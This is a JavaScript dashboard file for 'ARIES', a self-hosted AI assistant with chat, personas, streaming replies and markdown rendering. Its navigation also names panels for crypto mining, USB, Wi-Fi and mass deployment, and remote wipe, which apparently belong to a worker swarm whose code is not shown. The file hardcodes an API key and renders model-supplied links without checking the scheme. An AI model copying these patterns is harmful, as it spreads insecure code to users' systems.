/**
 * ARIES v7.0 - Dashboard Application
 * Cyberpunk Command Center - Final Polish
 */
(function() {
  'use strict';

  var API_KEY = 'aries-api-2026';
  var WS_URL = 'ws://' + location.host;
  var ws = null;
  var wsReconnectTimer = null;
  var currentPanel = 'chat';
  var agentRefreshInterval = null;
  var logAutoRefresh = null;
  var _loadedPanels = {};
  var _chatAttachments = [];
  var _currentPersona = 'default';
  var _notifCount = 0;
  var _wsWasConnected = false;
  var _adminMode = false;
  var _ariesNetworkJoined = false;
  var _ariesCredits = 0;
  var _ariesTier = 'FREE';

  // ── Personas ──
  var PERSONAS = {
    default:  { name: 'Default',  icon: '\u{1F916}', prompt: 'You are Aries, an advanced AI assistant.' },
    coder:    { name: 'Coder',    icon: '\u{1F4BB}', prompt: 'You are Aries in Coder mode. Focus on code quality.' },
    creative: { name: 'Creative', icon: '\u{1F3A8}', prompt: 'You are Aries in Creative mode. Be imaginative.' },
    analyst:  { name: 'Analyst',  icon: '\u{1F4CA}', prompt: 'You are Aries in Analyst mode. Be data-focused.' },
    trader:   { name: 'Trader',   icon: '\u{1F4C8}', prompt: 'You are Aries in Trader mode. Focus on markets and finance.' }
  };

  // ── Slash Commands ──
  var SLASH_COMMANDS = [
    { cmd: '/help', desc: 'Show available commands' },
    { cmd: '/clear', desc: 'Clear chat history' },
    { cmd: '/export', desc: 'Export chat as markdown' },
    { cmd: '/persona', desc: 'Switch persona (default, coder, creative, analyst, trader)' },
    { cmd: '/search', desc: 'Search the web' },
    { cmd: '/memory', desc: 'Search memory' },
    { cmd: '/status', desc: 'Show system status' },
    { cmd: '/swarm', desc: 'Execute a swarm task' },
    { cmd: '/party', desc: '\u{1F389}' }
  ];

  // ── Debounce ──
  function debounce(fn, ms) {
    var timer;
    return function() {
      var args = arguments, ctx = this;
      clearTimeout(timer);
      timer = setTimeout(function() { fn.apply(ctx, args); }, ms);
    };
  }

  // ── API Helper ──
  function api(method, path, body, apiOpts) {
    apiOpts = apiOpts || {};
    var opts = {
      method: method,
      headers: { 'Content-Type': 'application/json', 'x-aries-key': API_KEY }
    };
    if (body) opts.body = JSON.stringify(body);
    return fetch('/api/' + path, opts)
      .then(function(r) {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.json();
      })
      .catch(function(e) {
        if (apiOpts.loud) toast('API error: ' + e.message, 'error');
        throw e;
      });
  }

  // ── Toast Notifications ──
  var _lastToastMsg = '', _lastToastTime = 0;
  function toast(msg, type) {
    var now = Date.now();
    if (type === 'error' && msg === _lastToastMsg && now - _lastToastTime < 5000) return;
    if (type === 'error') { _lastToastMsg = msg; _lastToastTime = now; }
    var container = document.getElementById('toastContainer');
    if (!container) return;
    var el = document.createElement('div');
    el.className = 'toast ' + (type || 'info');
    el.textContent = msg;
    container.appendChild(el);
    setTimeout(function() { if (el.parentNode) el.remove(); }, 4000);
  }

  // ── WebSocket ──
  function connectWS() {
    if (ws && ws.readyState < 2) return;
    try { ws = new WebSocket(WS_URL + '/ws'); } catch (e) { scheduleReconnect(); return; }
    ws.onopen = function() {
      setConnStatus(true);
      // Only show toast if this is a reconnection, not first connect
      if (_wsWasConnected) toast('Reconnected to Aries', 'success');
      else toast('Connected to Aries', 'success');
      _wsWasConnected = true;
      if (wsReconnectTimer) { clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
    };
    ws.onmessage = function(ev) { try { handleWSMessage(JSON.parse(ev.data)); } catch (e) {} };
    ws.onclose = function() { setConnStatus(false); scheduleReconnect(); };
    ws.onerror = function() { setConnStatus(false); };
  }

  function scheduleReconnect() {
    if (wsReconnectTimer) return;
    wsReconnectTimer = setTimeout(function() { wsReconnectTimer = null; connectWS(); }, 10000);
  }

  function setConnStatus(online) {
    var dot = document.getElementById('connDot');
    var label = document.getElementById('connLabel');
    var banner = document.getElementById('connLostBanner');
    if (online) {
      dot.className = 'conn-dot online'; dot.title = 'Connected'; label.textContent = 'Online';
      if (banner) banner.style.display = 'none';
    } else {
      dot.className = 'conn-dot offline'; dot.title = 'Disconnected'; label.textContent = 'Offline';
      // Only show banner if we previously had a connection
      if (banner && _wsWasConnected) banner.style.display = 'block';
    }
  }

  function handleWSMessage(msg) {
    var event = msg.event || msg.type || '';
    var data = msg.data || msg;
    if (event === 'system' || event === 'stats') updateStats(data);
    else if (event === 'chat' || (data.type === 'chat')) {
      var chatData = event === 'chat' ? data : msg;
      if (chatData.role === 'assistant') { hideChatTyping(); appendChatMessage('assistant', chatData.content); }
    } else if (event === 'swarm' || (data.type === 'swarm')) handleSwarmEvent(event === 'swarm' ? data : msg);
    else if (event === 'quickjoin-progress' || event === 'swarm-join-progress' || msg.type === 'quickjoin-progress' || msg.type === 'swarm-join-progress') {
      if (window._ariesQuickJoinHandler) window._ariesQuickJoinHandler(msg);
    }
    else if (event === 'flipper') handleFlipperEvent(data);
    else if (event === 'miner') {
      // FEATURE 2: Feed sparkline from hashrate-tick WS events
      if (data.event === 'hashrate-tick' && data.hashrate != null) {
        pushHashratePoint(data.hashrate);
        if (currentPanel === 'btc-miner') {
          drawHashrateChart();
          var hrEl2 = document.getElementById('minerHashVal');
          if (hrEl2) hrEl2.textContent = fmtHashrate(data.hashrate);
          // Update sparkline stats
          var sparkCur = document.getElementById('sparkCurrent');
          if (sparkCur) sparkCur.textContent = fmtHashrate(data.hashrate);
          var sparkAvg = document.getElementById('sparkAvg');
          if (sparkAvg && _hashrateHistory.length > 0) {
            var sum = 0; for (var si = 0; si < _hashrateHistory.length; si++) sum += _hashrateHistory[si].v;
            sparkAvg.textContent = fmtHashrate(sum / _hashrateHistory.length);
          }
          var sparkPeak = document.getElementById('sparkPeak');
          if (sparkPeak && _hashrateHistory.length > 0) {
            var peak = 0; for (var pi2 = 0; pi2 < _hashrateHistory.length; pi2++) { if (_hashrateHistory[pi2].v > peak) peak = _hashrateHistory[pi2].v; }
            sparkPeak.textContent = fmtHashrate(peak);
          }
        }
      }
      if (currentPanel === 'btc-miner') {
        var hrEl = document.getElementById('minerHashVal'); if (hrEl && data.hashrate) hrEl.textContent = fmtHashrate(data.hashrate);
        var accEl = document.getElementById('minerAccepted'); if (accEl && data.accepted != null) accEl.textContent = data.accepted;
        var rejEl = document.getElementById('minerRejected'); if (rejEl && data.rejected != null) rejEl.textContent = data.rejected;
        var upEl = document.getElementById('minerUptime'); if (upEl && data.uptime != null) upEl.textContent = fmtUptime ? fmtUptime(data.uptime) : data.uptime + 's';
      }
    }
    else if (event === 'swarm-update' || event === 'swarm-stats') {
      if (currentPanel === 'swarm' && typeof refreshWorkerDashboard === 'function') refreshWorkerDashboard();
      // FEATURE 1: Toast on worker join/leave
      var swEvt = data.data || data;
      if (swEvt.type === 'new-node' || swEvt.type === 'node-online') {
        var wName = (swEvt.worker && swEvt.worker.hostname) || 'Unknown';
        toast('🟢 Worker joined: ' + wName, 'success');
      } else if (swEvt.type === 'node-offline') {
        var wName2 = (swEvt.worker && swEvt.worker.hostname) || 'Unknown';
        toast('🔴 Worker left: ' + wName2, 'error');
      }
    }
    else if (event === 'distributed-ai' || data.type === 'distributed-ai') handleDistributedAiEvent(data);
    else if (event === 'packet-send') { if (data.event === 'stats') refreshPacketStats(); }
    else if (event === 'log') { if (currentPanel === 'logs') appendLogEntry(data); }
    else if (event === 'worker-chat') { if (currentPanel === 'swarm') loadWorkerChat(); }
    else if (event === 'usb-flash') {
      var pct = data.total ? Math.round((data.step / data.total) * 100) : 0;
      var prog = document.getElementById('usbFlashProgress'); if (prog) prog.style.width = pct + '%';
      var st = document.getElementById('usbFlashStatus'); if (st) st.textContent = data.status || '';
    }
  }

  function updateStats(data) {
    setText('statCpu', (data.cpu || 0).toFixed(0) + '%');
    setText('statRam', (data.memPct || 0) + '%');
  }
  function setText(id, val) { var el = document.getElementById(id); if (el) el.textContent = val; }

  // ═══════════════════════════════
  //  NAVIGATION
  // ═══════════════════════════════
  function initNav() {
    var items = document.querySelectorAll('.nav-item');
    for (var i = 0; i < items.length; i++) {
      items[i].addEventListener('click', function() { switchPanel(this.getAttribute('data-panel')); });
    }
  }

  function switchPanel(name) {
    var items = document.querySelectorAll('.nav-item');
    for (var i = 0; i < items.length; i++) items[i].classList.remove('active');
    var panels = document.querySelectorAll('.panel');
    for (var i = 0; i < panels.length; i++) panels[i].classList.remove('active');
    var targetItem = document.querySelector('.nav-item[data-panel="' + name + '"]');
    if (targetItem) targetItem.classList.add('active');
    var targetPanel = document.getElementById('panel-' + name);
    if (targetPanel) targetPanel.classList.add('active');
    currentPanel = name;
    if (!_loadedPanels[name]) { _loadedPanels[name] = true; loadPanelData(name); }
    if (agentRefreshInterval) { clearInterval(agentRefreshInterval); agentRefreshInterval = null; }
    if (logAutoRefresh) { clearInterval(logAutoRefresh); logAutoRefresh = null; }
    if (_workerRefreshTimer) { clearInterval(_workerRefreshTimer); _workerRefreshTimer = null; }
    if (name === 'agents') agentRefreshInterval = setInterval(refreshAgents, 15000);
  }

  function loadPanelData(name) {
    switch (name) {
      case 'home': loadDashboard(); break;
      case 'chat': break;
      case 'search': break;
      case 'agents': refreshAgents(); break;
      case 'swarm': refreshSwarm(); loadWorkerChat(); if (typeof refreshWorkerDashboard === 'function') refreshWorkerDashboard(); if (typeof hookSwarmPanelRefresh === 'function') hookSwarmPanelRefresh(); break;
      case 'memory': loadMemory(); break;
      case 'rag': loadRag(); break;
      case 'skills': loadSkills(); break;
      case 'logs': refreshLogs(); break;
      case 'gateway': loadGateway(); break;
      case 'ares': loadAres(); break;
      case 'evolve': loadEvolve(); break;
      case 'sentinel': loadSentinel(); break;
      case 'backup': loadBackup(); break;
      case 'settings': loadSettings(); break;
      case 'browser': loadBrowser(); break;
      case 'sandbox': loadSandboxStatus(); break;
      case 'swarm-mgr': refreshProviders(); refreshKeyVault(); break;
      case 'toolgen': loadToolGen(); break;
      case 'agentfactory': loadAgentFactory(); break;
      case 'usb-swarm': loadUsbSwarm(); break;
      case 'packet-send': loadPacketSend(); break;
      case 'btc-miner': loadBtcMiner(); break;
      case 'proxy-earnings': loadProxyEarnings(); break;
      case 'free-keys': loadFreeKeys(); break;
      case 'ad-deploy': loadAdDeploy(); break;
      case 'fleet-deploy': loadFleetDeploy(); break;
      case 'hotspot': loadHotspot(); break;
      case 'wifi-deploy': loadWifiDeploy(); break;
      case 'content-farm': refreshContentFarm(); break;
      case 'oracle-cloud': refreshOracleCloud(); break;
      case 'cloud-scale': loadCloudScale(); break;
      case 'worker-health': refreshWorkerHealth(); break;
      case 'task-marketplace': refreshMarketplace(); break;
      case 'docker-deploy': refreshDocker(); break;
      case 'pxe-boot': loadPxeBoot(); break;
      case 'network-watcher': loadNetworkWatcher(); break;
      case 'deploy-learner': loadDeployLearner(); break;
      case 'wol-manager': loadWolManager(); break;
      case 'link-deploy': loadLinkDeploy(); break;
      case 'hashrate-opt': loadHashrateOpt(); break;
      case 'gpu-mining': loadGpuMining(); break;
      case 'mass-deploy': loadMassDeploy(); break;
      case 'network': break;
      case 'monitor': refreshMonitor(); break;
      case 'models': refreshModels(); break;
      case 'aries-ai': loadAriesAi(); break;
      case 'mesh-network': loadMeshNetwork(); break;
      case 'relay-federation': loadRelayFederation(); break;
      case 'site-control': loadSiteControl(); break;
      case 'remote-wipe': loadRemoteWipe(); break;
      case 'swarm-intel': loadSwarmIntel(); break;
      case 'proxy-network': loadProxyNetwork(); break;
      case 'cloud-auto': loadCloudAuto(); break;
      case 'vbox': loadVbox(); break;
      case 'cross-site': loadCrossSite(); break;
      case 'credits': loadCredits(); break;
      case 'todos': loadTodos(); break;
      case 'bookmarks': loadBookmarks(); break;
      case 'git': loadGit(); break;
      case 'terminal': break;
    }
  }

  // ═══════════════════════════════
  //  DASHBOARD HOME
  // ═══════════════════════════════
  function loadDashboard() {
    var el = document.getElementById('dashboardContent');
    if (!el) return;
    el.innerHTML = '<div class="spinner"></div> Loading dashboard...';
    Promise.all([
      api('GET', 'status', null, {}).catch(function() { return {}; }),
      api('GET', 'system/monitor', null, {}).catch(function() { return {}; }),
      api('GET', 'history', null, {}).catch(function() { return { history: [] }; }),
      api('GET', 'notifications?limit=10', null, {}).catch(function() { return { notifications: [] }; }),
      api('GET', 'miner/status', null, {}).catch(function() { return {}; }),
      api('GET', 'miner/pnl', null, {}).catch(function() { return { pnl: {} }; })
    ]).then(function(results) {
      var status = results[0], monitor = results[1], chatHist = results[2];
      var notifs = results[3], minerStatus = results[4], minerPnl = results[5];
      var swarm = status.swarm || {};
      var html = '';
      html += '<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">';
      html += '<span style="font-size:18px;font-weight:700;color:var(--accent)">ARIES v' + escapeHtml(status.version || '5.0') + '</span>';
      html += '<span style="font-size:13px;color:var(--text-dim)">Uptime: ' + formatUptime(monitor.uptime || status.uptime || 0) + '</span></div>';
      html += '<div class="stat-row">';
      html += '<div class="stat-card"><div class="stat-card-val">' + (monitor.cpu || 0).toFixed(0) + '%</div><div class="stat-card-label">CPU</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (monitor.memPct || 0) + '%</div><div class="stat-card-label">RAM</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (swarm.totalAgents || 0) + '</div><div class="stat-card-label">Agents</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + (swarm.totalWorkers || 0) + '</div><div class="stat-card-label">Workers</div></div>';
      html += '<div class="stat-card"><div class="stat-card-val">' + ((chatHist.history || []).length) + '</div><div class="stat-card-label">Messages</div></div>';
      var hashrate = minerStatus.mining ? (minerStatus.hashrate || '0 H/s') : 'Off';
      html += '<div class="stat-card"><div class="stat-card-val" style="font-size:1em">' + escapeHtml(String(hashrate)) + '</div><div class="stat-card-label">Hashrate</div></div>';
      html += '</div>';
      html += '<div class="dashboard-grid">';
      // System Health
      html += '<div class="dashboard-card"><h3>&#x1F4CA; System Health</h3>';
      html += '<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-dim)">CPU ' + (monitor.cpu || 0).toFixed(0) + '%</label>';
      html += '<div style="background:#1a1a2e;border-radius:4px;height:8px;overflow:hidden"><div style="height:100%;width:' + (monitor.cpu || 0) + '%;background:linear-gradient(90deg,var(--accent),var(--accent2));transition:width 0.3s"></div></div></div>';
      html += '<div><label style="font-size:12px;color:var(--text-dim)">RAM ' + (monitor.memPct || 0) + '%</label>';
      html += '<div style="background:#1a1a2e;border-radius:4px;height:8px;overflow:hidden"><div style="height:100%;width:' + (monitor.memPct || 0) + '%;background:linear-gradient(90deg,var(--green),var(--yellow));transition:width 0.3s"></div></div></div></div>';
      // Quick Actions
      html += '<div class="dashboard-card"><h3>&#x26A1; Quick Actions</h3>';
      html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">';
      html += '<button class="btn-primary" onclick="window.aries.switchPanel(\'chat\')">&#x1F4AC; Chat</button>';
      html += '<button class="btn-sm" onclick="window.aries.switchPanel(\'btc-miner\')">&#x20BF; Mining</button>';
      html += '<button class="btn-sm" onclick="window.aries.switchPanel(\'network\')">&#x1F50D; Network</button>';
      html += '<button class="btn-sm" onclick="window.aries.switchPanel(\'terminal\')">&#x1F4BB; Terminal</button>';
      html += '</div></div>';
      // Recent Activity
      html += '<div class="dashboard-card"><h3>&#x1F4CB; Recent Activity</h3>';
      var activities = (notifs.notifications || []).slice(0, 8);
      if (activities.length === 0) html += '<div style="color:var(--text-dim);font-size:13px">No recent activity</div>';
      else for (var ai = 0; ai < activities.length; ai++) {
        var act = activities[ai];
        html += '<div class="activity-item"><span class="activity-time">' + (act.timestamp ? new Date(act.timestamp).toLocaleTimeString() : '') + '</span> ' + escapeHtml(act.description || act.type || 'Event') + '</div>';
      }
      html += '</div></div>';
      el.innerHTML = html;
    });
  }

  // ═══════════════════════════════
  //  CHAT
  // ═══════════════════════════════
  function initChat() {
    var input = document.getElementById('chatInput');
    var btn = document.getElementById('chatSend');
    btn.addEventListener('click', sendChat);
    input.addEventListener('keydown', function(e) {
      if (e.key === 'Enter' && !e.shiftKey && !e.ctrlKey) { e.preventDefault(); sendChat(); }
      if (e.key === 'Enter' && e.ctrlKey) { e.preventDefault(); sendChat(); }
    });
    input.addEventListener('input', debounce(function() {
      this.style.height = 'auto';
      this.style.height = Math.min(this.scrollHeight, 120) + 'px';
      var val = this.value;
      if (val === '/' || (val.startsWith('/') && val.indexOf(' ') === -1)) showSlashDropdown(val);
      else hideSlashDropdown();
    }, 50));
    api('GET', 'chat/history').then(function(data) {
      var history = data.history || [];
      for (var i = 0; i < history.length; i++) appendChatMessage(history[i].role, history[i].content);
    }).catch(function() {});
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.key === 'l' && currentPanel === 'chat') { e.preventDefault(); clearChat(); }
    });
    initPersonaSwitcher();
    initChatDragDrop();
    initModelSelector();
    setInterval(autoSaveChat, 30000);
    checkChatRecovery();
  }

  var _selectedModel = '';
  function initModelSelector() {
    var sel = document.getElementById('chatModelSelect');
    if (!sel) return;
    api('GET', 'models').then(function(d) {
      var models = d.models || [];
      var html = '<option value="">Auto (default)</option>';

      // Group models by source
      var ollamaModels = [], cloudModels = [];
      for (var i = 0; i < models.length; i++) {
        var m = models[i];
        if (m.source === 'ollama') ollamaModels.push(m);
        else cloudModels.push(m);
      }

      if (ollamaModels.length > 0) {
        html += '<optgroup label="\uD83D\uDCBB Local (Ollama)">';
        for (var oi = 0; oi < ollamaModels.length; oi++) {
          var om = ollamaModels[oi];
          var sizeStr = om.size ? ' [' + (om.size / 1e9).toFixed(1) + 'GB]' : '';
          html += '<option value="' + escapeHtml(om.name) + '">' + escapeHtml(om.name || 'unknown') + sizeStr + '</option>';
        }
        html += '</optgroup>';
      }

      if (cloudModels.length > 0) {
        html += '<optgroup label="\u2601\uFE0F Cloud">';
        for (var ci = 0; ci < cloudModels.length; ci++) {
          var cm = cloudModels[ci];
          var src = cm.source ? ' (' + cm.source + ')' : '';
          html += '<option value="' + escapeHtml(cm.name) + '">' + escapeHtml(cm.name || 'unknown') + src + '</option>';
        }
        html += '</optgroup>';
      }

      // Aries AI option
      if (_ariesNetworkJoined) {
        html += '<optgroup label="\u26A1 Aries Network">';
        html += '<option value="aries-collective">\u26A1 Aries AI (collective)</option>';
        html += '</optgroup>';
      } else {
        html += '<optgroup label="\u26A1 Aries Network">';
        html += '<option value="_join_aries" disabled style="color:#0ff">\u26A1 Get free AI \u2192 Join Aries Network</option>';
        html += '</optgroup>';
      }

      sel.innerHTML = html;
      var saved = localStorage.getItem('aries-chat-model');
      if (saved) { sel.value = saved; _selectedModel = saved; }
    }).catch(function() {
      sel.innerHTML = '<option value="">Auto (default)</option>';
    });
    sel.addEventListener('change', function() {
      if (this.value === '_join_aries') {
        this.value = _selectedModel || '';
        // Trigger join flow
        if (typeof joinSwarmWorker === 'function') joinSwarmWorker();
        else switchPanel('settings');
        return;
      }
      _selectedModel = this.value;
      localStorage.setItem('aries-chat-model', _selectedModel);
      var badge = document.getElementById('activeModelBadge');
      if (badge && _selectedModel) {
        badge.textContent = _selectedModel.split('/').pop().split(':')[0];
        badge._userSet = true;
      }
      toast(_selectedModel ? 'Model: ' + _selectedModel : 'Model: Auto', 'info');
    });
  }

  function initPersonaSwitcher() {
    var container = document.getElementById('personaSwitcher');
    if (!container) return;
    var html = '';
    var keys = Object.keys(PERSONAS);
    for (var i = 0; i < keys.length; i++) {
      var p = PERSONAS[keys[i]];
      var active = keys[i] === _currentPersona ? ' active' : '';
      html += '<button class="persona-btn' + active + '" data-persona="' + keys[i] + '" title="' + escapeHtml(p.name) + '">' + p.icon + ' ' + p.name + '</button>';
    }
    container.innerHTML = html;
    container.addEventListener('click', function(e) {
      var btn = e.target.closest('.persona-btn');
      if (!btn) return;
      switchPersona(btn.getAttribute('data-persona'));
    });
  }

  function switchPersona(name) {
    if (!PERSONAS[name]) return;
    _currentPersona = name;
    api('POST', 'persona', { name: name }).catch(function() {});
    var btns = document.querySelectorAll('.persona-btn');
    for (var i = 0; i < btns.length; i++) btns[i].classList.toggle('active', btns[i].getAttribute('data-persona') === name);
    toast('Persona: ' + PERSONAS[name].name, 'info');
  }

  function initChatDragDrop() {
    var chatPanel = document.getElementById('panel-chat');
    var dropZone = document.getElementById('chatDropZone');
    if (!chatPanel || !dropZone) return;
    chatPanel.addEventListener('dragover', function(e) { e.preventDefault(); dropZone.classList.add('active'); });
    chatPanel.addEventListener('dragleave', function(e) { if (!chatPanel.contains(e.relatedTarget)) dropZone.classList.remove('active'); });
    chatPanel.addEventListener('drop', function(e) {
      e.preventDefault(); dropZone.classList.remove('active');
      var files = e.dataTransfer.files;
      for (var i = 0; i < files.length; i++) addChatAttachment(files[i]);
    });
  }

  function addChatAttachment(file) {
    if (file.size > 1024 * 1024) { toast('File too large (max 1MB)', 'error'); return; }
    var reader = new FileReader();
    reader.onload = function() {
      _chatAttachments.push({ name: file.name, content: reader.result, type: file.type });
      renderAttachments();
    };
    reader.readAsText(file);
  }

  function renderAttachments() {
    var el = document.getElementById('chatAttachments');
    if (!el) return;
    var html = '';
    for (var i = 0; i < _chatAttachments.length; i++) {
      html += '<div class="chat-attachment">\u{1F4CE} ' + escapeHtml(_chatAttachments[i].name);
      html += ' <span class="remove-attach" onclick="window.aries.removeAttachment(' + i + ')">\u2715</span></div>';
    }
    el.innerHTML = html;
  }

  function removeAttachment(idx) { _chatAttachments.splice(idx, 1); renderAttachments(); }

  function showSlashDropdown(filter) {
    var el = document.getElementById('slashDropdown');
    if (!el) return;
    var filtered = SLASH_COMMANDS.filter(function(c) { return c.cmd.indexOf(filter) === 0; });
    if (filtered.length === 0) { hideSlashDropdown(); return; }
    var html = '';
    for (var i = 0; i < filtered.length; i++) {
      html += '<div class="slash-item" data-cmd="' + escapeHtml(filtered[i].cmd) + '"><span class="slash-cmd">' + escapeHtml(filtered[i].cmd) + '</span><span class="slash-desc">' + escapeHtml(filtered[i].desc) + '</span></div>';
    }
    el.innerHTML = html;
    el.classList.add('visible');
    el.onclick = function(e) {
      var item = e.target.closest('.slash-item');
      if (!item) return;
      document.getElementById('chatInput').value = item.getAttribute('data-cmd') + ' ';
      document.getElementById('chatInput').focus();
      hideSlashDropdown();
    };
  }

  function hideSlashDropdown() { var el = document.getElementById('slashDropdown'); if (el) el.classList.remove('visible'); }

  function sendChat() {
    var input = document.getElementById('chatInput');
    var msg = input.value.trim();
    if (!msg && _chatAttachments.length === 0) return;
    hideSlashDropdown();
    if (msg === '/clear') { clearChat(); input.value = ''; input.style.height = 'auto'; return; }
    if (msg === '/export') { exportChat(); input.value = ''; input.style.height = 'auto'; return; }
    if (msg === '/party') { triggerParty(); input.value = ''; input.style.height = 'auto'; return; }
    if (msg.startsWith('/persona ')) { switchPersona(msg.split(' ')[1]); input.value = ''; input.style.height = 'auto'; return; }

    var fullMsg = msg;
    if (_chatAttachments.length > 0) {
      fullMsg += '\n\n--- Attached Files ---\n';
      for (var i = 0; i < _chatAttachments.length; i++) fullMsg += '\n[' + _chatAttachments[i].name + ']:\n' + _chatAttachments[i].content + '\n';
      _chatAttachments = []; renderAttachments();
    }
    appendChatMessage('user', msg);
    input.value = ''; input.style.height = 'auto';
    showChatTyping();

    fetch('/api/chat/stream', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-aries-key': API_KEY },
      body: JSON.stringify({ message: fullMsg, model: _selectedModel || undefined })
    }).then(function(response) {
      hideChatTyping();
      if (!response.ok) throw new Error('HTTP ' + response.status);
      var reader = response.body.getReader();
      var decoder = new TextDecoder();
      var buffer = '';
      var fullText = '';
      var msgDiv = null;

      function processChunk(result) {
        if (result.done) return;
        buffer += decoder.decode(result.value, { stream: true });
        var lines = buffer.split('\n');
        buffer = lines.pop();
        for (var i = 0; i < lines.length; i++) {
          var line = lines[i].trim();
          if (!line.startsWith('data: ')) continue;
          var data = line.substring(6);
          if (data === '[DONE]') return;
          try {
            var parsed = JSON.parse(data);
            if (parsed.type === 'chunk' && parsed.text) {
              fullText += parsed.text;
              if (!msgDiv) {
                msgDiv = document.createElement('div');
                msgDiv.className = 'chat-msg assistant';
                var roleLabel = document.createElement('div');
                roleLabel.className = 'msg-role';
                roleLabel.textContent = 'Aries';
                msgDiv.appendChild(roleLabel);
                var body = document.createElement('div');
                body.className = 'msg-body';
                msgDiv.appendChild(body);
                document.getElementById('chatMessages').appendChild(msgDiv);
              }
              msgDiv.querySelector('.msg-body').innerHTML = formatMessage(fullText);
              scrollChatToBottom();
            }
            // Update active model badge when done event arrives
            if (parsed.type === 'done' && parsed.usedModel) {
              var badge = document.getElementById('activeModelBadge');
              if (badge) {
                var isOllama = parsed.usedModel.indexOf('ollama') >= 0;
                badge.textContent = parsed.usedModel.split('/').pop();
                badge.style.background = isOllama ? '#f97316' : '#22c55e';
                badge.style.color = '#000';
                badge.title = 'Last model: ' + parsed.usedModel;
                badge._userSet = true;
              }
            }
          } catch (e) {}
        }
        return reader.read().then(processChunk);
      }
      return reader.read().then(processChunk);
    }).catch(function(e) {
      hideChatTyping();
      toast('Chat error: ' + e.message, 'error');
    });
  }

  function appendChatMessage(role, content) {
    var container = document.getElementById('chatMessages');
    var div = document.createElement('div');
    div.className = 'chat-msg ' + role;
    var roleLabel = document.createElement('div');
    roleLabel.className = 'msg-role';
    roleLabel.textContent = role === 'user' ? 'You' : 'Aries';
    div.appendChild(roleLabel);
    var body = document.createElement('div');
    body.className = 'msg-body';
    body.innerHTML = formatMessage(content || '');
    div.appendChild(body);
    container.appendChild(div);
    scrollChatToBottom();
  }

  function scrollChatToBottom() { var c = document.getElementById('chatMessages'); if (c) c.scrollTop = c.scrollHeight; }

  // ── Markdown Renderer ──
  function formatMessage(text) {
    if (!text) return '';
    text = text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    text = text.replace(/```(\w*)\n([\s\S]*?)```/g, function(match, lang, code) {
      var highlighted = highlightSyntax(code, lang);
      var langLabel = lang || 'code';
      return '<div class="code-block-wrap"><div class="code-block-header"><span>' + escapeHtml(langLabel) + '</span><button class="code-copy-btn" onclick="window.aries.copyCode(this)">\u{1F4CB} Copy</button></div><pre><code>' + highlighted + '</code></pre></div>';
    });
    text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
    text = text.replace(/^### (.+)$/gm, '<h3>$1</h3>');
    text = text.replace(/^## (.+)$/gm, '<h2>$1</h2>');
    text = text.replace(/^# (.+)$/gm, '<h1>$1</h1>');
    text = text.replace(/\*\*\*(.+?)\*\*\*/g, '<strong><em>$1</em></strong>');
    text = text.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
    text = text.replace(/\*(.+?)\*/g, '<em>$1</em>');
    text = text.replace(/^&gt; (.+)$/gm, '<blockquote>$1</blockquote>');
    text = text.replace(/^---$/gm, '<hr>');
    text = text.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
    text = text.replace(/\n/g, '<br>');
    return text;
  }

  function highlightSyntax(code, lang) {
    var keywords = /\b(function|var|let|const|if|else|for|while|return|class|import|export|from|new|this|try|catch|throw|async|await|yield|switch|case|break|continue|default|do|in|of|typeof|instanceof|void|delete|null|undefined|true|false|def|print|lambda|with|as|elif|pass|raise|except|finally|self|None|True|False)\b/g;
    var strings = /(["'`])(?:(?!\1|\\).|\\.)*?\1/g;
    var comments = /(\/\/.*$|\/\*[\s\S]*?\*\/|#.*$)/gm;
    var numbers = /\b(\d+\.?\d*(?:e[+-]?\d+)?)\b/g;
    var funcs = /\b([a-zA-Z_]\w*)\s*\(/g;
    var tokens = [];
    var placeholder = function(cls, match) {
      var idx = tokens.length;
      tokens.push('<span class="' + cls + '">' + match + '</span>');
      return '\x00T' + idx + '\x00';
    };
    code = code.replace(comments, function(m) { return placeholder('syn-cm', m); });
    code = code.replace(strings, function(m) { return placeholder('syn-str', m); });
    code = code.replace(funcs, function(m, fn) { return placeholder('syn-fn', fn) + '('; });
    code = code.replace(keywords, function(m) { return placeholder('syn-kw', m); });
    code = code.replace(numbers, function(m) { return placeholder('syn-num', m); });
    code = code.replace(/\x00T(\d+)\x00/g, function(m, idx) { return tokens[parseInt(idx)]; });
    return code;
  }

  function copyCode(btn) {
    var wrap = btn.closest('.code-block-wrap');
    if (!wrap) return;
    var code = wrap.querySelector('code');
    if (!code) return;
    navigator.clipboard.writeText(code.textContent).then(function() {
      btn.textContent = '\u2713 Copied!';
      setTimeout(function() { btn.textContent = '\u{1F4CB} Copy'; }, 2000);
    });
  }

  function clearChat() {
    document.getElementById('chatMessages').innerHTML = '';
    api('DELETE', 'chat/history').catch(function() {});
    toast('Chat cleared', 'info');
  }

  function exportChat() {
    api('GET', 'history').then(function(data) {
      var messages = data.messages || data.history || [];
      var md = '# Aries Chat Export\n\n';
      if (messages.length === 0) { md += 'No messages.'; }
      else { for (var ei = 0; ei < messages.length; ei++) { md += '**' + (messages[ei].role || '?') + ':** ' + (messages[ei].content || '') + '\n\n'; } }
      var blob = new Blob([md], { type: 'text/markdown' });
      var a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'aries-chat-' + new Date().toISOString().slice(0, 10) + '.md';
      a.click();
      toast('Chat exported!', 'success');
    }).catch(function() {
      var msgs = document.querySelectorAll('.chat-msg');
      var md = '# Aries Chat Export\n\n';
      for (var i = 0; i < msgs.length; i++) {
        var role = msgs[i].querySelector('.msg-role');
        var body = msgs[i].querySelector('.msg-body');
        md += '**' + (role ? role.textContent : '?') + ':** ' + (body ? body.textContent : '') + '\n\n';
      }
      var blob = new Blob([md], { type: 'text/markdown' });
      var a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'aries-chat-' + new Date().toISOString().slice(0, 10) + '.md';
      a.click();
    });
  }

